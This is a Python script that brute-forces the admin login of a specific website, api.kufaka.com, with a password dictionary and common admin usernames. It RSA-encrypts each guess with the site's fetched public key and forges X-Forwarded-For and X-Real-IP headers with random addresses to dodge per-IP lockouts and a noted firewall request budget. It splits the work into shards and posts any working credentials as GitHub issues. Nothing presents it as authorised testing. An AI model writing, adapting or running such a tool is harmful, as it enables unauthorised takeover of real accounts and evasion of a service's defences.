import os, json, time, base64, random, urllib.parse, urllib.request, urllib.error, sys

BASE_URL = "https://api.kufaka.com"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")
STATIC_PEM = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwM5MT99IIm8ZhbD+yMoU
I23MdvoZ2fWPcewGNHTsobg1qRe3l2lCq9tuDMK+Pm0gnsaLZuly6HnsNWeIVHmL
g0eSy7Oh0EaLW7dC3l4h+8fVQRzqm0EUuh29rKUyPZDyd0Ax2HzbkwmQVCvglGsV
yWOyvS4gAihlH6klsHmIPTQJBjoFBE4Pgzb8/dGRedP2BwekSy2f/0kYIp/pZg8o
elhVhgmNjzzFpnn3jgeau19+y/QeFAmub2liHkuodpFmi4pSrWO6l2Tal/V6l3+L
wvtgYB0lVcMKE1iufhtyGpvDfPU/984hnWOudfJ6W/4rJbAD+vOaXmJ1kOl3cQSt
wQIDAQAB
-----END PUBLIC KEY-----"""

SHARD = int(os.environ["SHARD"])
BASE_SHARD = int(os.environ.get("BASE", "0"))
CAP = int(os.environ.get("CAP", "240"))
USERS = [u for u in (os.environ.get("USERS") or "admin,administrator,root,firstwxx,firstwxx1").split(",") if u]
TAG = os.environ.get("TAG", "r1")
GH_TOKEN = os.environ.get("GH_TOKEN", "")
REPO = os.environ.get("REPO", "")
DICT = os.environ.get("DICT", "kfq_dict.txt")
MAX_REQS = 248  # keep below ESA per-source-IP ~250 request budget


def tlv(b, i):
    tag = b[i]; i += 1
    l = b[i]; i += 1
    if l & 0x80:
        n = l & 0x7f
        l = int.from_bytes(b[i:i + n], "big"); i += n
    return tag, b[i:i + l], i + l


def pem_nums(pem):
    der = base64.b64decode("".join(l.strip() for l in pem.strip().splitlines() if "-----" not in l))
    _, v, _ = tlv(der, 0)
    _, _, i = tlv(v, 0)
    _, bits, _ = tlv(v, i)
    _, seq, _ = tlv(bits[1:], 0)
    _, n, j = tlv(seq, 0)
    _, e, _ = tlv(seq, j)
    return int.from_bytes(n, "big"), int.from_bytes(e, "big")


def rsa_enc(n, e, msg):
    k = (n.bit_length() + 7) // 8
    m = msg.encode()
    ps_len = k - 3 - len(m)
    if ps_len < 8:
        raise ValueError("pw too long")
    ps = bytes(random.randint(1, 255) for _ in range(ps_len))
    em = b"\x00\x02" + ps + b"\x00" + m
    return base64.b64encode(pow(int.from_bytes(em, "big"), e, n).to_bytes(k, "big")).decode()


_recent = []

def rand_ip():
    for _ in range(20):
        ip = "%d.%d.%d.%d" % (random.randint(1, 223), random.randint(0, 255),
                              random.randint(0, 255), random.randint(1, 254))
        if ip not in _recent:
            _recent.append(ip)
            if len(_recent) > 16:
                _recent.pop(0)
            return ip
    return ip


def http_get_pub(timeout=10):
    req = urllib.request.Request(BASE_URL + "/admin/auth/getPublicKey")
    for k, v in {"User-Agent": UA, "X-Requested-With": "XMLHttpRequest",
                 "Referer": "https://api.kufaka.com/admin/",
                 "Accept": "application/json, text/plain, */*"}.items():
        req.add_header(k, v)
    r = urllib.request.urlopen(req, timeout=timeout)
    return r.read().decode("utf-8", "replace")


def post_login(username, pw_enc, xff, timeout=12):
    body = urllib.parse.urlencode({"username": username, "password": pw_enc, "totp": "", "enc": "1"})
    req = urllib.request.Request(BASE_URL + "/admin/auth/login", data=body.encode(), method="POST")
    for k, v in {"User-Agent": UA, "X-Requested-With": "XMLHttpRequest",
                 "Content-Type": "application/x-www-form-urlencoded",
                 "Accept": "application/json, text/plain, */*",
                 "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
                 "Origin": "https://api.kufaka.com",
                 "Referer": "https://api.kufaka.com/admin/",
                 "X-Forwarded-For": xff, "X-Real-IP": xff}.items():
        req.add_header(k, v)
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as ex:
        try:
            b = ex.read().decode("utf-8", "replace")
        except Exception:
            b = ""
        return ex.code, b
    except Exception as ex:
        return 0, "ERR:%s" % type(ex).__name__


def classify(st, txt):
    if st == 0 or txt.startswith("ERR:"):
        return "err"
    if st in (403, 429):
        return "block"
    if "多次登录失败" in txt:
        return "lock"
    if "用户名或密码错误" in txt or "请确保各项不能为空" in txt:
        return "miss"
    if "解密失败" in txt:
        return "decrypt"
    if st == 200:
        return "cand"
    return "http%d" % st


def gh_issue(title, body):
    if not (GH_TOKEN and REPO):
        print("NO_TOKEN_FOR_ISSUE", flush=True)
        return
    try:
        data = json.dumps({"title": title, "body": body[:60000]}).encode()
        req = urllib.request.Request("https://api.github.com/repos/%s/issues" % REPO, data=data, method="POST")
        req.add_header("Authorization", "token " + GH_TOKEN)
        req.add_header("Accept", "application/vnd.github+json")
        req.add_header("Content-Type", "application/json")
        urllib.request.urlopen(req, timeout=30).read()
        print("ISSUE_CREATED", flush=True)
    except Exception as e:
        print("ISSUE_ERR %s" % str(e)[:200], flush=True)


def main():
    gshard = BASE_SHARD + SHARD
    words = [w.strip() for w in open(DICT, encoding="utf-8", errors="ignore") if w.strip()]
    attempts = [(u, w) for w in words for u in USERS]
    total = len(attempts)
    start = gshard * CAP
    end = min(total, start + CAP)
    planned = max(0, end - start)
    print("START shard=%d words=%d users=%s total=%d range=[%d,%d) planned=%d tag=%s"
          % (gshard, len(words), USERS, total, start, end, planned, TAG), flush=True)
    if planned == 0:
        print("RESULT shard=%d planned=0 tested=0 miss=0 lock=0 block=0 err=0 other=0 cand=0 hit=0 reqs=0 untested=0"
              % gshard, flush=True)
        return

    # pubkey: live first (bounded), static fallback
    pem, src = STATIC_PEM, "static"
    for i in range(3):
        try:
            t = http_get_pub(timeout=8)
            m = json.loads(t)
            pem = m["data"]["public_key"]
            src = "live"
            break
        except Exception as ex:
            print("PUBKEY_RETRY %d %s" % (i, type(ex).__name__), flush=True)
            time.sleep(1)
    n, e = pem_nums(pem)
    print("PUBKEY src=%s bits=%d" % (src, n.bit_length()), flush=True)

    stats = {"miss": 0, "lock": 0, "block": 0, "err": 0, "other": 0, "cand": 0, "hit": 0}
    reqs = 0
    tested = 0
    cands = []
    t0 = time.time()
    i = 0
    while i < planned:
        u, w = attempts[start + i]
        pw_enc = rsa_enc(n, e, w)
        xff = rand_ip()
        st, txt = post_login(u, pw_enc, xff)
        reqs += 1
        v = classify(st, txt)
        if v == "lock":
            stats["lock"] += 1
            # per-XFF lock: retry once with a brand-new XFF
            if reqs < MAX_REQS - 1:
                st, txt = post_login(u, pw_enc, rand_ip())
                reqs += 1
                v = classify(st, txt)
        elif v == "err" or v == "decrypt":
            if reqs < MAX_REQS - 1:
                st, txt = post_login(u, pw_enc, rand_ip())
                reqs += 1
                v = classify(st, txt)
        if v == "cand":
            stats["cand"] += 1
            if st == 200 and '"code":200' in txt.replace(" ", ""):
                stats["hit"] += 1
            cands.append({"user": u, "pw": w, "st": st, "resp": txt[:400]})
            print("*** CAND user=%r pw=%r st=%s resp=%r" % (u, w, st, txt[:200]), flush=True)
            gh_issue("KFQ-%s shard=%d CAND" % (TAG, gshard),
                     json.dumps({"shard": gshard, "user": u, "pw": w, "st": st, "resp": txt[:1000]}, ensure_ascii=False))
        else:
            stats[v] += 1
        tested += 1
        i += 1
        if i % 40 == 0:
            print("[%.0fs] %d/%d %s reqs=%d" % (time.time() - t0, i, planned, stats, reqs), flush=True)
        if reqs >= MAX_REQS:
            print("REQ_BUDGET_STOP reqs=%d tested=%d" % (reqs, tested), flush=True)
            break
    untested = planned - tested
    print("RESULT shard=%d planned=%d tested=%d miss=%d lock=%d block=%d err=%d other=%d cand=%d hit=%d reqs=%d untested=%d elapsed=%.0f"
          % (gshard, planned, tested, stats["miss"], stats["lock"], stats["block"], stats["err"],
             stats["other"], stats["cand"], stats["hit"], reqs, untested, time.time() - t0), flush=True)
    print("CANDS_JSON " + json.dumps(cands, ensure_ascii=False)[:2000], flush=True)


main()
